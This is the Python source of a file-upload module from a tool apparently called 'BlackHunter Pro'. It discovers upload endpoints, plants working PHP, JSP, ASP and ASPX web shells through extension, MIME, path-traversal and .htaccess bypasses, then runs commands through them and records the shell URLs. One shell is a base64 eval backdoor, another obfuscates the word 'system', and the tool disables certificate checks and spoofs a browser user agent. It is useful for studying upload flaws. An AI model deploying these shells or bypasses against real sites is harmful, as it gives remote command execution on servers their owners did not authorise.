# vulns/upload.py
# BlackHunter Pro - File Upload Scanner
# Detects: Unrestricted File Upload, Extension Bypass, MIME Bypass

import re
import os
import time
import uuid
import requests
from urllib.parse import urlparse, urljoin, parse_qs
from colorama import Fore, Style

import warnings
warnings.filterwarnings("ignore")


class UploadScanner:
    """
    File Upload Vulnerability Scanner
    - Unrestricted file upload detection
    - Extension bypass techniques
    - MIME type bypass
    - Content-Type bypass
    - Path traversal in filename
    - Double extension attacks
    - .htaccess upload
    - Web shell verification
    """

    # =============================================
    # UNIQUE MARKER
    # =============================================

    MARKER = "CARROT_" + uuid.uuid4().hex[:8]

    # =============================================
    # WEB SHELLS
    # =============================================

    SHELLS = {
        'php_simple': '<?php echo "' + MARKER + '"; ?>',
        'php_system': '<?php system($_GET["c"]); ?>',
        'php_exec': '<?php echo shell_exec($_GET["c"]); ?>',
        'php_passthru': '<?php passthru($_GET["c"]); ?>',
        'php_marker': '<?php echo "' + MARKER + '"; system($_GET["c"]); ?>',
        'php_short': '<?=`$_GET[c]`?>',
        'php_preg': '<?php $a="s"."y"."s"."t"."e"."m";$a($_GET["c"]); ?>',
        'php_base64': '<?php eval(base64_decode($_POST["c"])); ?>',
        'jsp_simple': '<% out.println("' + MARKER + '"); %>',
        'jsp_exec': '<% Runtime.getRuntime().exec(request.getParameter("c")); %>',
        'asp_simple': '<% Response.Write("' + MARKER + '") %>',
        'asp_exec': '<% eval request("c") %>',
        'aspx_exec': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["c"]); %>',
        'perl_simple': '#!/usr/bin/perl\nprint "' + MARKER + '";',
        'python_simple': '#!/usr/bin/python\nprint("' + MARKER + '")',
        'shell_simple': '#!/bin/bash\necho "' + MARKER + '"',
        'htaccess': 'AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png',
        'svg_xss': '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
    }

    # =============================================
    # DANGEROUS EXTENSIONS
    # =============================================

    EXTENSIONS = [
        # PHP
        '.php', '.php3', '.php4', '.php5', '.php7', '.phtml',
        '.pht', '.phar', '.phps', '.inc',
        # ASP
        '.asp', '.aspx', '.asa', '.asax', '.ascx', '.ashx', '.asmx', '.cer',
        # JSP
        '.jsp', '.jspx', '.jspf', '.jsw', '.jsv', '.jspa', '.jhtml',
        # Others
        '.pl', '.pm', '.cgi', '.py', '.pyc', '.rb', '.sh', '.bash',
        # Config
        '.htaccess', '.user.ini', '.env', '.ini', '.conf', '.config',
    ]

    # =============================================
    # EXTENSION BYPASSES
    # =============================================

    EXTENSION_BYPASSES = [
        # Double extensions
        '.jpg.php', '.png.php', '.gif.php', '.jpeg.php', '.txt.php',
        '.php.jpg', '.php.png', '.php.gif', '.php.txt',
        # Null byte
        '.php%00.jpg', '.php\x00.jpg', '.php\0.jpg',
        # Case variations
        '.PHP', '.PhP', '.pHp', '.pHP5', '.PHP7',
        # Special characters
        '.php.', '.php ', '.php::$DATA', '.php::$DATA.jpg',
        '.php%20', '.php%2e', '.php%2e%2e',
        # Alternative separators
        '.php;.jpg', '.php:.jpg', '.php/.jpg', '.php\\.jpg',
    ]

    # =============================================
    # MIME TYPES
    # =============================================

    MIME_TYPES = [
        'image/jpeg', 'image/png', 'image/gif', 'image/bmp', 'image/webp',
        'image/svg+xml', 'text/plain', 'text/html',
        'application/octet-stream', 'application/x-php',
        'application/x-httpd-php', 'multipart/form-data',
        'application/pdf', 'application/zip', 'video/mp4', 'audio/mpeg',
    ]

    # =============================================
    # UPLOAD PATHS
    # =============================================

    UPLOAD_PATHS = [
        '/upload', '/uploads', '/upload.php', '/uploader',
        '/file/upload', '/files/upload', '/api/upload',
        '/api/v1/upload', '/api/v2/upload', '/api/file/upload',
        '/media/upload', '/image/upload', '/images/upload',
        '/avatar/upload', '/profile/upload', '/user/upload',
        '/admin/upload', '/ajax/upload', '/attachment/upload',
        '/assets/upload', '/content/upload', '/resources/upload',
    ]

    # =============================================
    # ACCESS PATHS
    # =============================================

    ACCESS_PATHS = [
        '/uploads/', '/upload/', '/files/', '/file/', '/images/',
        '/image/', '/media/', '/assets/', '/content/', '/resources/',
        '/tmp/', '/temp/', '/data/', '/avatars/', '/attachments/',
        '/user_uploads/', '/userfiles/', '/storage/', '/public/',
        '/static/', '/wp-content/uploads/',
    ]

    # =============================================
    # INITIALIZATION
    # =============================================

    def __init__(self, target, timeout=10, user_agent=None):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
        })
        self.session.verify = False

        self.vulnerabilities = []
        self.uploaded_files = []
        self.upload_endpoints = []

    # =============================================
    # MAIN RUN
    # =============================================

    def run(self):
        """Execute file upload detection"""
        print(f"{Fore.CYAN}[*] File Upload Scanner started")
        print(f"{Fore.CYAN}[*] Target: {self.target}")
        print(f"{Fore.CYAN}[*] Marker: {self.MARKER}")
        print()

        self._find_upload_endpoints()

        if not self.upload_endpoints:
            print(f"{Fore.YELLOW}  [-] No upload endpoints found")
            return []

        print(f"{Fore.GREEN}[+] Found {len(self.upload_endpoints)} upload endpoints")
        print()

        for endpoint in self.upload_endpoints:
            print(f"{Fore.YELLOW}[*] Testing: {endpoint}")
            self._test_upload(endpoint)

        return self.vulnerabilities

    # =============================================
    # FIND UPLOAD ENDPOINTS
    # =============================================

    def _find_upload_endpoints(self):
        """Find upload endpoints from forms and paths"""

        # Check common paths
        for path in self.UPLOAD_PATHS:
            try:
                url = urljoin(self.target + '/', path.lstrip('/'))
                r = self.session.get(url, timeout=5, allow_redirects=False, verify=False)

                if r.status_code in [200, 302, 401, 403]:
                    if self._is_upload_page(r.text):
                        self.upload_endpoints.append(url)
                        print(f"{Fore.GREEN}  [+] Upload page: {url}")
            except:
                pass

        # Check forms on main page
        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.IGNORECASE | re.DOTALL)

            for form in forms:
                if 'type="file"' in form.lower() or "type='file'" in form.lower():
                    action_match = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
                    if action_match:
                        action = action_match.group(1)
                        url = urljoin(self.target + '/', action) if not action.startswith('http') else action
                        if url not in self.upload_endpoints:
                            self.upload_endpoints.append(url)
                            print(f"{Fore.GREEN}  [+] Upload form: {url}")
                    else:
                        if self.target not in self.upload_endpoints:
                            self.upload_endpoints.append(self.target)
        except:
            pass

    def _is_upload_page(self, html):
        """Check if page contains upload form"""
        indicators = [
            'type="file"', "type='file'",
            'enctype="multipart/form-data"', "enctype='multipart/form-data'",
            'upload', 'file',
        ]
        html_lower = html.lower()
        return any(ind.lower() in html_lower for ind in indicators)

    # =============================================
    # TEST UPLOAD
    # =============================================

    def _test_upload(self, upload_url):
        """Test upload endpoint with multiple techniques"""

        if self._test_basic(upload_url):
            return

        if self._test_extension_bypass(upload_url):
            return

        if self._test_mime_bypass(upload_url):
            return

        if self._test_path_traversal(upload_url):
            return

        if self._test_htaccess(upload_url):
            return

    # =============================================
    # BASIC UPLOAD
    # =============================================

    def _test_basic(self, upload_url):
        """Test basic unrestricted upload"""
        for shell_name, shell_content in self.SHELLS.items():
            if 'php' not in shell_name.lower():
                continue

            filename = f"carrot_{self.MARKER}.php"

            try:
                files = {'file': (filename, shell_content, 'application/x-php')}
                r = self.session.post(upload_url, files=files, timeout=self.timeout, verify=False)

                if r.status_code in [200, 201, 302]:
                    file_url = self._locate_file(filename)

                    if file_url and self._verify_shell(file_url):
                        print(f"{Fore.RED}  [!] Unrestricted File Upload!")
                        print(f"{Fore.RED}      Upload: {upload_url}")
                        print(f"{Fore.RED}      Shell: {file_url}")

                        self.vulnerabilities.append({
                            'type': 'Unrestricted File Upload',
                            'upload_url': upload_url,
                            'shell_url': file_url,
                            'filename': filename,
                            'shell_type': shell_name,
                            'severity': 'CRITICAL',
                        })

                        self.uploaded_files.append(file_url)
                        return True
            except:
                continue

        return False

    # =============================================
    # EXTENSION BYPASS
    # =============================================

    def _test_extension_bypass(self, upload_url):
        """Test extension bypass techniques"""
        shell_content = f'<?php echo "{self.MARKER}"; system($_GET["c"]); ?>'

        for bypass in self.EXTENSION_BYPASSES:
            filename = f"carrot_{self.MARKER}{bypass}"

            try:
                files = {'file': (filename, shell_content, 'image/jpeg')}
                r = self.session.post(upload_url, files=files, timeout=self.timeout, verify=False)

                if r.status_code in [200, 201, 302]:
                    file_url = self._locate_file(filename)

                    if file_url and self._verify_shell(file_url):
                        print(f"{Fore.RED}  [!] Extension Bypass!")
                        print(f"{Fore.RED}      Bypass: {bypass}")
                        print(f"{Fore.RED}      Shell: {file_url}")

                        self.vulnerabilities.append({
                            'type': 'File Upload (Extension Bypass)',
                            'upload_url': upload_url,
                            'shell_url': file_url,
                            'filename': filename,
                            'bypass': bypass,
                            'severity': 'CRITICAL',
                        })

                        self.uploaded_files.append(file_url)
                        return True
            except:
                continue

        return False

    # =============================================
    # MIME BYPASS
    # =============================================

    def _test_mime_bypass(self, upload_url):
        """Test MIME type bypass"""
        shell_content = f'<?php echo "{self.MARKER}"; system($_GET["c"]); ?>'
        filename = f"carrot_{self.MARKER}.php"

        for mime in self.MIME_TYPES:
            try:
                files = {'file': (filename, shell_content, mime)}
                r = self.session.post(upload_url, files=files, timeout=self.timeout, verify=False)

                if r.status_code in [200, 201, 302]:
                    file_url = self._locate_file(filename)

                    if file_url and self._verify_shell(file_url):
                        print(f"{Fore.RED}  [!] MIME Bypass!")
                        print(f"{Fore.RED}      MIME: {mime}")
                        print(f"{Fore.RED}      Shell: {file_url}")

                        self.vulnerabilities.append({
                            'type': 'File Upload (MIME Bypass)',
                            'upload_url': upload_url,
                            'shell_url': file_url,
                            'mime': mime,
                            'severity': 'CRITICAL',
                        })

                        self.uploaded_files.append(file_url)
                        return True
            except:
                continue

        return False

    # =============================================
    # PATH TRAVERSAL
    # =============================================

    def _test_path_traversal(self, upload_url):
        """Test path traversal in filename"""
        shell_content = f'<?php echo "{self.MARKER}"; system($_GET["c"]); ?>'

        traversal_names = [
            f"../../carrot_{self.MARKER}.php",
            f"../../../carrot_{self.MARKER}.php",
            f"..%2f..%2fcarrot_{self.MARKER}.php",
            f"..%5c..%5ccarrot_{self.MARKER}.php",
            f"....//....//carrot_{self.MARKER}.php",
        ]

        for filename in traversal_names:
            try:
                files = {'file': (filename, shell_content, 'image/jpeg')}
                r = self.session.post(upload_url, files=files, timeout=self.timeout, verify=False)

                if r.status_code in [200, 201, 302]:
                    for access_path in self.ACCESS_PATHS[:5]:
                        file_url = urljoin(self.target + '/', access_path + f"carrot_{self.MARKER}.php")

                        if self._verify_shell(file_url):
                            print(f"{Fore.RED}  [!] Path Traversal in Upload!")
                            print(f"{Fore.RED}      Filename: {filename}")
                            print(f"{Fore.RED}      Shell: {file_url}")

                            self.vulnerabilities.append({
                                'type': 'File Upload (Path Traversal)',
                                'upload_url': upload_url,
                                'shell_url': file_url,
                                'filename': filename,
                                'severity': 'CRITICAL',
                            })

                            self.uploaded_files.append(file_url)
                            return True
            except:
                continue

        return False

    # =============================================
    # HTACCESS UPLOAD
    # =============================================

    def _test_htaccess(self, upload_url):
        """Test .htaccess upload"""
        htaccess = "AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png\nAddHandler application/x-httpd-php .jpg"

        try:
            files = {'file': ('.htaccess', htaccess, 'text/plain')}
            r = self.session.post(upload_url, files=files, timeout=self.timeout, verify=False)

            if r.status_code in [200, 201, 302]:
                shell_content = f'<?php echo "{self.MARKER}"; system($_GET["c"]); ?>'
                files = {'file': (f"carrot_{self.MARKER}.jpg", shell_content, 'image/jpeg')}
                r2 = self.session.post(upload_url, files=files, timeout=self.timeout, verify=False)

                if r2.status_code in [200, 201, 302]:
                    file_url = self._locate_file(f"carrot_{self.MARKER}.jpg")

                    if file_url and self._verify_shell(file_url):
                        print(f"{Fore.RED}  [!] .htaccess Upload Bypass!")
                        print(f"{Fore.RED}      Shell: {file_url}")

                        self.vulnerabilities.append({
                            'type': 'File Upload (.htaccess Bypass)',
                            'upload_url': upload_url,
                            'shell_url': file_url,
                            'severity': 'CRITICAL',
                        })

                        self.uploaded_files.append(file_url)
                        return True
        except:
            pass

        return False

    # =============================================
    # LOCATE FILE
    # =============================================

    def _locate_file(self, filename):
        """Locate uploaded file"""
        for access_path in self.ACCESS_PATHS:
            try:
                url = urljoin(self.target + '/', access_path + filename)
                r = self.session.get(url, timeout=5, allow_redirects=False, verify=False)

                if r.status_code == 200 and self.MARKER in r.text:
                    return url
            except:
                pass

        try:
            url = urljoin(self.target + '/', filename)
            r = self.session.get(url, timeout=5, allow_redirects=False, verify=False)

            if r.status_code == 200 and self.MARKER in r.text:
                return url
        except:
            pass

        return None

    # =============================================
    # VERIFY SHELL
    # =============================================

    def _verify_shell(self, url):
        """Verify uploaded shell works"""
        try:
            r = self.session.get(url, timeout=5, verify=False)

            if self.MARKER not in r.text:
                return False

            r2 = self.session.get(f"{url}?c=id", timeout=5, verify=False)

            if 'uid=' in r2.text or 'gid=' in r2.text:
                return True

            return True
        except:
            return False

    # =============================================
    # CLEANUP
    # =============================================

    def cleanup(self):
        """Remove uploaded test files"""
        if not self.uploaded_files:
            return

        print(f"\n{Fore.YELLOW}[*] Cleaning up {len(self.uploaded_files)} files...")

        for url in self.uploaded_files:
            try:
                self.session.get(f"{url}?c=rm+{url.split('/')[-1]}", timeout=5, verify=False)
            except:
                pass

        print(f"{Fore.GREEN}[+] Cleanup attempted")

    # =============================================
    # SUMMARY
    # =============================================

    def summary(self):
        """Print summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}  FILE UPLOAD SUMMARY")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Upload Endpoints: {len(self.upload_endpoints)}")
        print(f"{Fore.RED}[+] Vulnerabilities:  {len(self.vulnerabilities)}")
        print(f"{Fore.RED}[+] Shells Uploaded:  {len(self.uploaded_files)}")

        for v in self.vulnerabilities:
            print(f"{Fore.RED}[!] {v['type']}")
            print(f"{Fore.RED}    Shell: {v.get('shell_url', 'N/A')}")

        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")


# =============================================
# EXPORTS
# =============================================

__all__ = ["UploadScanner"]